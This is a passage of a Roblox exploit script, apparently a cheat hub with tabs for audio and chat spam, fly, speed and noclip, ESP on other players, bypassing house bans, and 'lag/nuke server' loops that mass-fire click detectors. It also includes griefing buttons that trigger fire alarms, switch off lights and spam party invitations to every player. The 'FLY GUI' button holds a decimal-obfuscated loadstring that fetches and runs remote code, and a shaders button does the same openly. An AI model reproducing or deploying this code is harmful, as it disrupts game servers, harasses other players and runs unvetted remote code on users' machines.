        if LoopTextboxEnabled then
            task.spawn(function()
                if not textboxCooldownValue then 
                    textboxCooldownValue = 0.2 
                end
                
                while LoopTextboxEnabled and SoundIdValue ~= "" do
                    fireSniperRemote(SoundIdValue)
                    task.wait(textboxCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SoundIdValue ~= "" then
        runAudioAllSystem(SoundIdValue)
    end
end})

TabSound:AddSection({"Preset FE Sounds"})

TabSound:AddDropdown({
    Name = "SELECT PRESET AUDIO",
    Description = "Choose a preset sound effect",
    Options = DropdownOptions,
    Default = "GET OUT",
    Callback = function(selected)
        SelectedDropdownAudio = selected
    end
})

TabSound:AddButton({"PLAY PRESET SOUND", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then fireSniperRemote(id) end
    end
end})

TabSound:AddTextBox({
    Name = "PRESET LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            DropdownCooldownValue = num
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP PRESET SOUND",
    Default = false,
    Callback = function(state)
        LoopDropdownEnabled = state
        if LoopDropdownEnabled then
            task.spawn(function()
                while LoopDropdownEnabled and SelectedDropdownAudio ~= "" do
                    local id = PresetAudios[SelectedDropdownAudio]
                    if id then 
                        fireSniperRemote(id) 
                    end
                    task.wait(DropdownCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then runAudioAllSystem(id) end
    end
end})

-- TAB CHAT
do
    local TabChat = Window:MakeTab({"CHAT", "message-square"})

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TextChatService = game:GetService("TextChatService")

    local ChatMessageValue = ""
    local SpamChatEnabled = false
    local SpamCooldownValue = 0.5

    TabChat:AddSection({"Chat Spammer"})

    TabChat:AddTextBox({
        Name = "MESSAGE",
        Description = "Enter message to spam",
        PlaceholderText = "Type message here...",
        Callback = function(value)
            ChatMessageValue = tostring(value)
        end
    })

    TabChat:AddTextBox({
        Name = "SPAM COOLDOWN",
        Description = "Set interval in seconds",
        PlaceholderText = "0.5",
        Callback = function(value)
            local num = tonumber(value)
            if num and num > 0 then
                SpamCooldownValue = num
            end
        end
    })

    TabChat:AddToggle({
        Name = "SPAM CHAT",
        Default = false,
        Callback = function(state)
            SpamChatEnabled = state
            if SpamChatEnabled then
                task.spawn(function()
                    while SpamChatEnabled and ChatMessageValue ~= "" do
                        pcall(function()
                            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                                if channel then
                                    channel:SendAsync(ChatMessageValue)
                                end
                            else
                                local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                                    chatEvents.SayMessageRequest:FireServer(ChatMessageValue, "All")
                                end
                            end
                        end)
                        task.wait(SpamCooldownValue)
                    end
                end)
            end
        end
    })
end

-- TAB PLAYER
local Tab6 = Window:MakeTab({"PLAYER", "user"})

local SectionBasic = Tab6:AddSection({"Basic Functions"})

Tab6:AddButton({"FLY GUI", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\119\105\57\57\57\45\98\108\105\112\47\77\114\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\69\65\68\77\69\46\109\100\34\41\41\40\41")()
end})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer

local SPIN_ENABLED = false
local SPIN_CONN = nil
local SPIN_SPEED = 90

local WALK_SPEED = 30
local JUMP_POWER = 60
local GRAVITY_VALUE = Workspace.Gravity or 196.2

local function getCharacterAndHumanoid()
    local char = LP.Character
    if not char then return nil, nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    return char, hum
end

local function startSpin()
    if SPIN_ENABLED then return end
    SPIN_ENABLED = true
    if SPIN_CONN then pcall(function() SPIN_CONN:Disconnect() end) end
    SPIN_CONN = RunService.Heartbeat:Connect(function(dt)
        if not SPIN_ENABLED then return end
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local angleRad = math.rad(SPIN_SPEED * dt)
            pcall(function()
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, angleRad, 0)
            end)
        end
    end)
end

local function stopSpin()
    SPIN_ENABLED = false
    if SPIN_CONN then
        pcall(function() SPIN_CONN:Disconnect() end)
        SPIN_CONN = nil
    end
end

local function SPIN(on)
    if on == nil then
        if SPIN_ENABLED then stopSpin() else startSpin() end
    else
        if on then startSpin() else stopSpin() end
    end
end

LP.CharacterAdded:Connect(function(char)
    task.defer(function()
        local hum = char:WaitForChild("Humanoid", 5) or char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.WalkSpeed = WALK_SPEED end)
            pcall(function() hum.JumpPower = JUMP_POWER end)
        end
        if SPIN_ENABLED then
            startSpin()
        end
    end)
end)

Tab6:AddToggle({
    Name = "SPIN",
    Default = false,
    Callback = function(state)
        SPIN(state)
    end
})

Tab6:AddTextBox({
    Name = "SPIN SPEED (deg/s)",
    Description = "Set turning rotation speed",
    PlaceholderText = "90",
    Callback = function(text)
        local n = tonumber(text)
        if n then SPIN_SPEED = n end
    end
})

Tab6:AddSlider({
    Name = "WALK SPEED",
    Min = 16,
    Max = 300,
    Default = WALK_SPEED,
    Increase = 1,
    Callback = function(value)
        WALK_SPEED = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.WalkSpeed = WALK_SPEED end
    end
})

Tab6:AddSlider({
    Name = "JUMP POWER",
    Min = 50,
    Max = 400,
    Default = JUMP_POWER,
    Increase = 1,
    Callback = function(value)
        JUMP_POWER = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.JumpPower = JUMP_POWER end
    end
})

Tab6:AddSlider({
    Name = "GRAVITY",
    Min = 0,
    Max = 196,
    Default = math.floor(GRAVITY_VALUE),
    Increase = 1,
    Callback = function(value)
        GRAVITY_VALUE = value
        Workspace.Gravity = GRAVITY_VALUE
    end
})

local noclipEnabled = false
local noclipConn = nil

local function startNoClip()
    if noclipEnabled then return end
    noclipEnabled = true

    noclipConn = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = false end)
                end
            end
        end
    end)
end

local function stopNoClip()
    if not noclipEnabled then return end
    noclipEnabled = false
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
end

Tab6:AddToggle({
    Name = "NOCLIP",
    Default = false,
    Callback = function(val)
        if val then startNoClip() else stopNoClip() end
    end
})

-- TAB PROTECTIONS
do
    local TabProtections = Window:MakeTab({"PROTECTIONS", "shield"})

    TabProtections:AddToggle({
        Name = "ANTI SIT",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Seat") or v:IsA("VehicleSeat") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiSeatLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Seat") or v:IsA("VehicleSeat") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiSeatLoop then
                    getgenv().AntiSeatLoop:Disconnect()
                    getgenv().AntiSeatLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI VOID",
        Default = false,
        Callback = function(state)
            if state then
                getgenv().AntiVoidLoop = game:GetService("RunService").Heartbeat:Connect(function()
                    pcall(function()
                        local hrp = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if hrp and hrp.Position.Y <= -450 then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            hrp.CFrame = CFrame.new(0, 50, 0)
                        end
                    end)
                end)
            else
                if getgenv().AntiVoidLoop then
                    getgenv().AntiVoidLoop:Disconnect()
                    getgenv().AntiVoidLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI BANANA",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiBananaLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiBananaLoop then
                    getgenv().AntiBananaLoop:Disconnect()
                    getgenv().AntiBananaLoop = nil
                end
            end
        end
    })
end

-- ==========================================
-- TAB TOOLS/NUKES
-- ==========================================
local TabItem = Window:MakeTab({"TOOLS/NUKES", "hammer"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

local NukeEnabled = false
local SelectedNuke = "LAG SERVER (BOMB)"
local NukeThread
local LastUnequip = 0

local function FindObject(name)
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name:lower() == name:lower() then
            return v
        end
    end
end

local function UnequipAllTools()
    local char = LP.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:UnequipTools()
    end
end

local function TeleportAndSpam(obj)
    if not obj or not NukeEnabled then return end

    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
    if cd then
        if obj:IsA("Model") then
            hrp.CFrame = obj:GetModelCFrame()
        elseif obj:IsA("BasePart") then
            hrp.CFrame = obj.CFrame
        end

        local startTime = tick()
        while NukeEnabled and obj and cd and (tick() - startTime < 1.5) do
            for i = 1, 25 do
                if not NukeEnabled then break end
                fireclickdetector(cd)
            end
            if not NukeEnabled then break end
            RunService.Heartbeat:Wait()
        end
    end
end

local function StopNuke()
    NukeEnabled = false
    if NukeThread then
        task.cancel(NukeThread)
        NukeThread = nil
    end
end

local function MainLoop(typeName)
    while NukeEnabled and SelectedNuke == typeName do
        if SelectedNuke:find("LAG SERVER") then
            if tick() - LastUnequip >= 67 then
                LastUnequip = tick()
                UnequipAllTools()
            end
        end

        if not NukeEnabled then break end

        if typeName == "LAG SERVER (BOMB)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Bomb")) end
        elseif typeName == "LAG SERVER (SNIPER)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Sniper")) end
        elseif typeName == "NUKE SERVER(FLASH LIGHT)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Toolsflashlight")) end
        end

        if not NukeEnabled then break end
        RunService.Heartbeat:Wait()
    end
end

local function StartNuke()
    StopNuke()
    NukeEnabled = true
    LastUnequip = tick()

    NukeThread = task.spawn(function()
        MainLoop(SelectedNuke)
    end)
end

-- ================= DROPDOWN LAG TYPE =================
TabItem:AddDropdown({
    Name = "LAG TYPE",
    Description = "Select the execution method",
    Options = {
        "LAG SERVER (BOMB)",
        "LAG SERVER (SNIPER)",
        "NUKE SERVER(FLASH LIGHT)"
    },
    Default = "LAG SERVER (BOMB)",
    Callback = function(v)
        SelectedNuke = v
    end
})

-- ================= TOGGLE EXECUTE =================
TabItem:AddToggle({
    Name = "ENABLE NUKE / LAG",
    Default = false,
    Callback = function(state)
        if state then
            StartNuke()
        else
            StopNuke()
        end
    end
})

-- ================= PARAGRAPH INFO =================
TabItem:AddParagraph({"WARNING", "To use the FLASHLIGHT NUKE, you must own House 056 (the Haunted House). The nuke will not work without this house."})

--================================================================================
-- TOOLS FODA
--================================================================================

_G.RGB_Speed = 1
_G.RGB_PaintActive = false
_G.RGB_TorchActive = false

TabItem:AddSection({"TOOLS"})

-- TEXTBOX FOR SPEED
TabItem:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle velocity",
	PlaceholderText = "1",
	Callback = function(Value)
        local n = tonumber(Value)
        if n then _G.RGB_Speed = n end
	end	  
})

-- PAINT ROLLER
TabItem:AddButton({"GET PAINT ROLLER", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PaintRoller")
end})

TabItem:AddToggle({
	Name = "PAINT ROLLER RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_PaintActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_PaintActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- GUARD TORCH
TabItem:AddButton({"GET TORCH", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "GuardTorch")
end})

TabItem:AddToggle({
	Name = "TORCH RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_TorchActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_TorchActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- ================= AUTO GIVE TORCH =================
local RS = game:GetService("ReplicatedStorage")
local pizzaLoop = false
local pizzaConn = nil
local RANGE = 2000

local function getNearbyPlayers()
    local nearby = {}
    if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then
        return nearby
    end

    local myPos = LP.Character.HumanoidRootPart.Position

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist <= RANGE then
                table.insert(nearby, plr)
            end
        end
    end
    return nearby
end

local function givePizza(player)
    local args = {
        "ToolGiveToServer",
        player,
        "GuardTorch"
    }

    RS:WaitForChild("RE")
      :WaitForChild("1Playe1rTrigge1rEven1t")
      :FireServer(unpack(args))
end

TabItem:AddToggle({
    Name = "AUTO GIVE TORCH (15 STUDS)",
    Default = false,
    Callback = function(state)
        pizzaLoop = state

        if pizzaConn then
            pizzaConn:Disconnect()
            pizzaConn = nil
        end

        if state then
            pizzaConn = RunService.Heartbeat:Connect(function()
                for _, plr in ipairs(getNearbyPlayers()) do
                    pcall(function()
                        givePizza(plr)
                    end)
                end
                task.wait(0.25)
            end)
        end
    end
})

-- ==========================================
-- TAB HOUSES
-- ==========================================
local TabHouse = Window:MakeTab({"HOUSES", "home"})

-- REMOVE HOUSE BAN (DELETA O BLOCO)
TabHouse:AddButton({"REMOVE HOUSE BAN", function()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name == "BannedBlock" then
			obj:Destroy()
		end
	end
end})

-- AUTO REMOVE BAN
TabHouse:AddToggle({
	Name = "AUTO REMOVE BAN",
	Default = false,
	Callback = function(Value)
		_G.AutoUnbanActive = Value
		if Value then
			_G.BanMonitor = workspace.DescendantAdded:Connect(function(obj)
				if _G.AutoUnbanActive and obj.Name == "BannedBlock" then
					obj:Destroy()
				end
			end)
		else
			if _G.BanMonitor then _G.BanMonitor:Disconnect() end
		end
	end    
})

-- =========================
-- RGB CASA LOGIC
-- =========================
local RGBHouseSettings = {
    Speed = 1,
    States = {}
}

local function GetHouseRGBColor()
    local hue = tick() * RGBHouseSettings.Speed % 5 / 5
    return Color3.fromHSV(hue, 1, 1)
end

local function StartHouseRGBEffect(config)
    RGBHouseSettings.States[config.StateKey] = true
    task.spawn(function()
        while RGBHouseSettings.States[config.StateKey] do
            if not (game.Players.LocalPlayer and game.Players.LocalPlayer.Parent) then
                RGBHouseSettings.States[config.StateKey] = false
                break
            end
            pcall(config.Action)
            task.wait(config.Delay)
        end
    end)
end

TabHouse:AddSection({"RGB HOUSE"})

TabHouse:AddToggle({
    Name = "RGB HOUSE",
    Default = false,
    Callback = function(enabled)
        if enabled then
            StartHouseRGBEffect({
                StateKey = "house",
                Delay = 0.1,
                Action = function()
                    local color = GetHouseRGBColor()
                    pcall(function()
                        game.ReplicatedStorage.RE["1Player1sHous1e"]:FireServer("ColorPickHouse", color)
                    end)
                end
            })
        else
            RGBHouseSettings.States["house"] = false
        end
    end
})

TabHouse:AddTextBox({
    Name = "RGB SPEED",
    Description = "Set house rainbow transition velocity",
    PlaceholderText = "1",
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 then
            RGBHouseSettings.Speed = speed
        end
    end
})

-- =========================
-- RED BLACK RGB HOUSE
-- =========================
local RedBlackHouseSettings = {
	Speed = 1,
	Enabled = false,
	Index = 1,
	Colors = {
		Color3.fromRGB(255, 0, 0),   -- RED
		Color3.fromRGB(0, 0, 0),     -- BLACK
		Color3.fromRGB(255, 255, 255) -- WHITE
	}
}

local function GetNextRedBlackColor()
	RedBlackHouseSettings.Index = RedBlackHouseSettings.Index + 1
	if RedBlackHouseSettings.Index > #RedBlackHouseSettings.Colors then
		RedBlackHouseSettings.Index = 1
	end
	return RedBlackHouseSettings.Colors[RedBlackHouseSettings.Index]
end

local function StartRedBlackHouseRGB()
	task.spawn(function()
		while RedBlackHouseSettings.Enabled do
			local color = GetNextRedBlackColor()
			pcall(function()
				game.ReplicatedStorage.RE["1Player1sHous1e"]
					:FireServer("ColorPickHouse", color)
			end)
			task.wait(1 / RedBlackHouseSettings.Speed)
		end
	end)
end

TabHouse:AddSection({"RED BLACK HOUSE RGB"})

TabHouse:AddToggle({
	Name = "RGB HOUSE (RED BLACK)",
	Default = false,
	Callback = function(v)
		RedBlackHouseSettings.Enabled = v
		if v then
			StartRedBlackHouseRGB()
		end
	end
})

TabHouse:AddTextBox({
	Name = "RGB SPEED (RED BLACK)",
	Description = "Set blinking rate speed",
	PlaceholderText = "1",
	Callback = function(value)
		local speed = tonumber(value)
		if speed and speed > 0 then
			RedBlackHouseSettings.Speed = speed
		end
	end
})

-- ==========================================
-- TAB FUN
-- ==========================================
local TabFun = Window:MakeTab({"FUN", "smile"})

LoopConvitesEnabled = false

local function getHRP()
	local char = LP.Character or LP.CharacterAdded:Wait()
	return char:WaitForChild("HumanoidRootPart")
end

local function findBasePart(inst)
	if inst:IsA("BasePart") then return inst end
	for _, d in ipairs(inst:GetDescendants()) do
		if d:IsA("BasePart") then
			return d
		end
	end
end

local function getCFrame(obj)
	if obj:IsA("Model") then
		if obj.PrimaryPart then
			return obj.PrimaryPart.CFrame
		end
		local part = obj:FindFirstChildWhichIsA("BasePart", true)
		if part then return part.CFrame end
	elseif obj:IsA("BasePart") then
		return obj.CFrame
	end
end

local function getAllHighers()
	local list = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name:lower() == "higher" then
			table.insert(list, obj)
		end
	end
	return list
end

local function click30(obj)
	local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
	if not cd then return end
	for i = 1, 30 do
		fireclickdetector(cd)
		task.wait(0.04)
	end
end

--================================================================================
-- COMMERCIAL ADVERTISER
--================================================================================
TabFun:AddButton({"RED BLACK COMMUNITY MESSAGE", function()
    local hrp = getHRP()
    if not hrp then return end

    local originalPos = hrp.CFrame

    hrp.CFrame = CFrame.new(-239, 89.5, -548)
    task.wait(0.6)

    local RE_Cemetery = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y")

    pcall(function()
        RE_Cemetery:FireServer("ReturningCommercialWords", 3, nil, "RED BLACK COMMUNITY ON TOP")
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialWordColor", 3, Color3.new(1, 0, 0.0357508659362793))
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialBackGround", 3, Color3.new(0, 0, 0))
    end)

    task.wait(0.4)
    hrp.CFrame = originalPos
end})

-- =========================================================
-- CHAOS BUTTON
-- =========================================================
TabFun:AddButton({"FIRE IN ALL RESTAURANTS", function()
	local hrp = getHRP()
	local originalCFrame = hrp.CFrame

	for _, higher in ipairs(getAllHighers()) do
		local cf = getCFrame(higher)
		if cf then
			hrp.CFrame = cf * CFrame.new(0, 2, 0)
			task.wait(0.25)

			click30(higher)
			task.wait(0.25)
		end
	end

	hrp.CFrame = originalCFrame
end})

-- =========================
-- SCHOOL FIRE ALARM ALERT
-- =========================
TabFun:AddButton({"SCHOOL FIRE ALARM ALERT", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:find("FireAlarmClicker") then
            local clickDetector = obj:FindFirstChildWhichIsA("ClickDetector")
            if clickDetector then
                local targetCFrame = nil
                if obj:IsA("Model") then
                    if obj.PrimaryPart then
                        targetCFrame = obj.PrimaryPart.CFrame
                    else
                        local part = obj:FindFirstChildWhichIsA("BasePart")
                        if part then targetCFrame = part.CFrame end
                    end
                elseif obj:IsA("BasePart") then
                    targetCFrame = obj.CFrame
                end

                if targetCFrame then
                    hrp.CFrame = targetCFrame + Vector3.new(0, 3, 0)
                    task.wait(0.1)
                    fireclickdetector(clickDetector)
                    task.wait(0.2)
                end
            end
        end
    end

    hrp.CFrame = originalCFrame
end})

-- =========================
-- LIGHT SWITCH FUCKER
-- =========================
TabFun:AddButton({"TURN OFF ALL SWITCHES", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:lower():find("lightswitch") then
            local click = obj:FindFirstChildWhichIsA("ClickDetector", true)
            if click then
                local part = findBasePart(click.Parent)
                if part then
                    hrp.CFrame = part.CFrame
                    task.wait(1)

                    fireclickdetector(click)    
                    task.wait(0.1)    
                    fireclickdetector(click)    
                end    
            end    
        end    
    end    

    hrp.CFrame = originalCFrame
end})

-- =========================================================
-- LOOP DE CONVITES IRRITAR
-- =========================================================
TabFun:AddToggle({
    Name = "INVITATION LOOP ALL",
    Default = false,
    Callback = function(state)
        LoopConvitesEnabled = state
        
        if LoopConvitesEnabled then
            task.spawn(function()
                while LoopConvitesEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LP and LoopConvitesEnabled then
                            pcall(function()
                                local args = {
                                    "HouseParty",
                                    {
                                        player.UserId
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("StartFreeParty"):FireServer(unpack(args))
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
})

-- ==========================================
-- TAB VISUAL
-- ==========================================
local TabESP = Window:MakeTab({"VISUAL", "eye"})

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- ESP FOLDERS
-- ==========================================
local espFolder = CoreGui:FindFirstChild("RBH_ESP_Billboards") or Instance.new("Folder", CoreGui)
espFolder.Name = "RBH_ESP_Billboards"

local highlightFolder = CoreGui:FindFirstChild("RBH_Highlights") or Instance.new("Folder", CoreGui)
highlightFolder.Name = "RBH_Highlights"

-- ==========================================
-- STATE
-- ==========================================
local espEnabled = false
local activeSchemeKey = "red"
local playerESP = {}
local playerAddedConn, playerRemovingConn

-- ==========================================
-- COLOR SCHEMES
-- ==========================================
local COLOR_SCHEMES = {
    red       = {hl = Color3.fromRGB(255,0,0),     name = Color3.fromRGB(255,255,255)},
    yellow    = {hl = Color3.fromRGB(255,215,0),   name = Color3.fromRGB(0,0,0)},
    blue      = {hl = Color3.fromRGB(0,150,255),   name = Color3.fromRGB(255,255,255)},
    green     = {hl = Color3.fromRGB(0,255,128),   name = Color3.fromRGB(0,0,0)},
    white     = {hl = Color3.fromRGB(255,255,255), name = Color3.fromRGB(0,0,0)},
    black     = {hl = Color3.fromRGB(0,0,0),       name = Color3.fromRGB(255,255,255)},
    brown     = {hl = Color3.fromRGB(139,69,19),   name = Color3.fromRGB(255,255,255)},
    darkgreen = {hl = Color3.fromRGB(0,100,0),     name = Color3.fromRGB(255,255,255)},
    purple    = {hl = Color3.fromRGB(128,0,128),   name = Color3.fromRGB(255,255,255)},
    magenta   = {hl = Color3.fromRGB(255,0,255),   name = Color3.fromRGB(255,255,255)}
}

local highlightColor = COLOR_SCHEMES.red.hl
local nameColor = COLOR_SCHEMES.red.name

-- ==========================================
-- ESP CORE
-- ==========================================
local function clearESP(player)
    if playerESP[player] then
        if playerESP[player].highlight then playerESP[player].highlight:Destroy() end
        if playerESP[player].billboard then playerESP[player].billboard:Destroy() end
        playerESP[player] = nil
    end
end

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    clearESP(player)

    local char = player.Character

    -- Highlight
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillColor = highlightColor
    highlight.OutlineColor = highlightColor
    highlight.FillTransparency = 0.75
    highlight.OutlineTransparency = 0
    highlight.Parent = highlightFolder

    -- Billboard
    local adornee = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    local billboard
    if adornee then
        billboard = Instance.new("BillboardGui")
        billboard.Adornee = adornee
        billboard.Size = UDim2.new(0,200,0,30)
        billboard.StudsOffset = Vector3.new(0,2.5,0)
        billboard.AlwaysOnTop = true
        billboard.Parent = espFolder

        local txt = Instance.new("TextLabel", billboard)
        txt.Size = UDim2.new(1,0,1,0)
        txt.BackgroundTransparency = 1
        txt.Text = player.DisplayName .. " | " .. player.Name
        txt.TextColor3 = nameColor
        txt.TextStrokeTransparency = 0.6
        txt.Font = Enum.Font.GothamBold
        txt.TextSize = 14
    end

    playerESP[player] = {
        highlight = highlight,
        billboard = billboard
    }
end

local function enableESP()
    espEnabled = true
    for _, plr in ipairs(Players:GetPlayers()) do
        createESP(plr)
    end

    playerAddedConn = Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(0.2)
            if espEnabled then createESP(plr) end
        end)
    end)

    playerRemovingConn = Players.PlayerRemoving:Connect(clearESP)
end

local function disableESP()
    espEnabled = false
    for plr in pairs(playerESP) do
        clearESP(plr)
    end
    if playerAddedConn then playerAddedConn:Disconnect() end
    if playerRemovingConn then playerRemovingConn:Disconnect() end
end

local function updateColors()
    for _, data in pairs(playerESP) do
        if data.highlight then
            data.highlight.FillColor = highlightColor
            data.highlight.OutlineColor = highlightColor
        end
        if data.billboard and data.billboard:FindFirstChildOfClass("TextLabel") then
            data.billboard.TextLabel.TextColor3 = nameColor
        end
    end
end

local function setScheme(key)
    local scheme = COLOR_SCHEMES[key]
    if not scheme then return end
    highlightColor = scheme.hl
    nameColor = scheme.name
    activeSchemeKey = key
    if espEnabled then updateColors() end
end

-- ================= VISUAL UI ELEMENTS =================

TabESP:AddButton({"SHADERS 4K", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/SHADERS-4K-V1/refs/heads/main/Omaga"))()
end})

TabESP:AddDropdown({
    Name = "ESP COLOR",
    Description = "Select target outline color",
    Options = {
        "RED","YELLOW","BLUE","GREEN","WHITE",
        "BLACK","BROWN","DARKGREEN","PURPLE","MAGENTA"
    },
    Default = "RED",
    Callback = function(v)
        setScheme(string.lower(v))
    end
})

TabESP:AddToggle({
    Name = "ENABLE ESP",
    Default = false,
    Callback = function(state)
        if state then enableESP() else disableESP() end
    end
})

-- ================= SAFE PROP ESP + COLOR =================
do
	local RunService = game:GetService("RunService")

	local enabled = false
	local objects = {}
	local renderConn
	local addConn

	local PROP_COLORS = {
		red     = Color3.fromRGB(255,0,0),
		yellow  = Color3.fromRGB(255,215,0),
		blue    = Color3.fromRGB(0,150,255),
		green   = Color3.fromRGB(0,255,128),
		white   = Color3.fromRGB(255,255,255),
		black   = Color3.fromRGB(0,0,0),
		purple  = Color3.fromRGB(128,0,128),
		magenta = Color3.fromRGB(255,0,255)
	}

	local currentColor = PROP_COLORS.red

	local function updateColor()
		for _,v in pairs(objects) do
			if v.H then
				v.H.FillColor = currentColor
				v.H.OutlineColor = currentColor
			end
		end
	end

	local function valid(model)
		if not model:IsA("Model") then return false end
		if model.Name:sub(1,4) ~= "Prop" then return false end

		local nick = model.Name:sub(5)
		if nick == "" then return false end

		return Players:FindFirstChild(nick) ~= nil
	end

	local function create(model)
		if objects[model] then return end
		if not valid(model) then return end

		local part = model:FindFirstChildWhichIsA("BasePart")
		if not part then return end

		local h = Instance.new("Highlight")
		h.FillColor = currentColor
